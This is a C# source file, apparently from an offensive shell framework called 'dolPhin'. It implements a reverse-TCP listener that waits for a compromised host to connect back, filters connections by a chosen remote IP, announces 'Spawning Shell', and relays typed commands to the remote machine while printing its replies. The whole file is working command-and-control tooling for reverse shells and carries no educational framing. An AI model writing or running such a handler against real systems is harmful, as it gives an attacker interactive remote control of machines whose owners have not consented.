using System.Text;
using System.Net.Sockets;
using System.Net;
using static dolPhin.clean.print;

namespace dolPhin.shell.Command.cmds.reversetcp
{
    public class reversetcpconnection
    {
        public static List<string> clientList = new List<string>();
        public static void run(string lhost, string rhost, int lport)
        {
            try
            {
                bool validl = validIPV4(lhost);
                bool validr = validIPV4(rhost);
                bool validp = validPort(lport);

                if (!validr)
                {
                    if (rhost.Trim() == "*")
                    {
                        validr = true;
                    }
                }


                if (validl && validr && validp)
                {
                    IPAddress ipaddr = IPAddress.Parse(lhost);
                    IPEndPoint localEP = new IPEndPoint(ipaddr, lport);
                    TcpListener tcpListener = new TcpListener(localEP);
                    TcpClient tcpClient = null;

                    printf("[+] ", ConsoleColor.Green, "Using Server Address (", ConsoleColor.White, lhost, ConsoleColor.Blue, ")\n", ConsoleColor.White);
                    printf("[+] ", ConsoleColor.Green, "Using Server Port    (", ConsoleColor.White, lport, ConsoleColor.Blue, ")\n", ConsoleColor.White);
                    
                    printf("[+] ", ConsoleColor.Green, "Waiting for "+ (rhost.Trim()=="*" ? "" : "         ("), ConsoleColor.White,  rhost.Trim()=="*" ? "anyone" : lhost, rhost.Trim()=="*" ? ConsoleColor.White : ConsoleColor.Blue, (rhost.Trim()=="*"? "" : ")")+"\n", ConsoleColor.White);

                    printf(" ____________________________________ \n", ConsoleColor.White);
                    printf("| ", ConsoleColor.White, "IPAddress", ConsoleColor.Green, "       | ", ConsoleColor.White, "Port", ConsoleColor.Blue, "  | ", ConsoleColor.White, "Time", ConsoleColor.Yellow, "     |\n", ConsoleColor.White);
                    printf("|-----------------|-------|----------|\n", ConsoleColor.White);

                    tcpListener.Start();
                    tcpClient = tcpListener.AcceptTcpClient();

                    while (((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString() != rhost)
                    {
                        if (rhost.Trim() != "*")
                        {
                            string rip = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                            string rp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Port.ToString();

                            if (!clientList.Contains(rip))
                            {
                                printf("| ", ConsoleColor.White,
                                       $"{addspace(rip, 15)}", ConsoleColor.Green,
                                       " | ", ConsoleColor.White,
                                       $"{addspace(rp, 5)}", ConsoleColor.Blue,
                                       " | ", ConsoleColor.White,
                                       $"{DateTime.Now.ToString("HH:mm:ss")}", ConsoleColor.Yellow,
                                       " |\n", ConsoleColor.White);
                                clientList.Add(rip);
                            }


                            tcpListener.Stop();
                            tcpClient.GetStream().Close();
                            tcpClient.Close();
                            tcpListener.Start();
                            tcpClient = tcpListener.AcceptTcpClient();
                        }
                        else
                        {
                            break;
                        }
                    }

                    printf("| ", ConsoleColor.White,
                                       $"{addspace(((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString(), 15)}", ConsoleColor.Green,
                                       " | ", ConsoleColor.White,
                                       $"{addspace(((IPEndPoint)tcpClient.Client.RemoteEndPoint).Port.ToString(), 5)}", ConsoleColor.Blue,
                                       " | ", ConsoleColor.White,
                                       $"{DateTime.Now.ToString("HH:mm:ss")}", ConsoleColor.Yellow,
                                       " |\n", ConsoleColor.White);
                    printf(" ------------------------------------ \n\n", ConsoleColor.White);

                    printf("[*] ", ConsoleColor.Blue, "Connection received.\n", ConsoleColor.White);
                    printf("[+] ", ConsoleColor.Green, "Spawning Shell\n\n", ConsoleColor.White);
                    Program.tcpc = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();

                    int index = 0;
                    string firstMessage = string.Empty;
                    while (true)
                    {
                        try
                        {
                            index++;
                            NetworkStream stream = tcpClient.GetStream();                            
                            byte[] array = new byte[tcpClient.ReceiveBufferSize];
                            
                            if (index != 1 && dshell.variables.ContainsKey("second") || !dshell.variables.ContainsKey("second"))
                            {
                                int num2 = stream.Read(array, 0, array.Length);
                            }

                            string RecivedData = Encoding.ASCII.GetString(array);
                            RecivedData = RecivedData.Replace("\0", "");

                            try
                            {
                                RecivedData = RecivedData.Substring(0, RecivedData.Length - 1);
                            } catch { }

                            if (array.Length > 65536)
                            {
                                array = new byte[tcpClient.ReceiveBufferSize];
                            }
                            string Command = string.Empty;

                            if (index == 1)
                            {
                                firstMessage = RecivedData;
                                Console.Write(firstMessage + (dshell.variables.ContainsKey("cprompt") ? "\n\n" : ""));
                            }
                            else
                            {
                                Console.Write(RecivedData + (dshell.variables.ContainsKey("cprompt") ? "\n\n" : ""));
                            }

                            while (string.IsNullOrEmpty(Command.Trim()))
                            {
                                printf(shell.dshell.prompt());
                                Command = Console.ReadLine();
                            }

                            RecivedData = string.Empty;
                            byte[] bytes = Encoding.ASCII.GetBytes(Command);
                            stream.Write(bytes, 0, bytes.Length);
                            stream.Flush();
                        }
                        catch (Exception ex)
                        {
                            printf("E: ", ConsoleColor.Red, ex.Message + "\n", ConsoleColor.White);
                            Program.tcpc = "cmd";
                            tcpListener.Stop();
                            tcpClient.GetStream().Close();
                            tcpClient.Close();
                            break;
                        }
                    }

                    Program.tcpc = "cmd";
                }
                else
                {
                    printExceptionNotConnected(validl,validr,validp);
                }
            }
            catch (Exception ex) 
            {
                printf("E: ", ConsoleColor.Red, ex.Message, ConsoleColor.White);
            }
        }

        public static void printExceptionNotConnected(bool validl, bool validr, bool validp)
        {
            if (!validl)
            {
                printf("E: ", ConsoleColor.Red, "lhost is not an valid IPAddress.\n", ConsoleColor.White);
            }

            if (!validr)
            {
                printf("E: ", ConsoleColor.Red, "rhost is not an valid IPAddress.\n", ConsoleColor.White);
            }

            if (!validp)
            {
                printf("E: ", ConsoleColor.Red, "lport is not an valid Port.\n", ConsoleColor.White);
            }
        }

        public static string addspace(string st, int max)
        {
            string result = st;
            for (int i = st.Length; i < max; i++)
            {
                result += " ";
            }
            return result;
        }

        public static bool validPort(int port)
        {
            if (port >= 1 && port <= 65535)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public static bool validIPV4(string adddress)
        {
            adddress = adddress.Trim();
            if (adddress.Contains('.') &&
                adddress.Length <= 15 &&
                adddress.Length >= 7 &&
                IsDigitsOnly(adddress.Replace(".", "")))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public static bool IsDigitsOnly(string str)
        {
            foreach (char c in str)
            {
                if (c < '0' || c > '9') {
                    return false;
                }
            }
            return true;
        }
    }
}
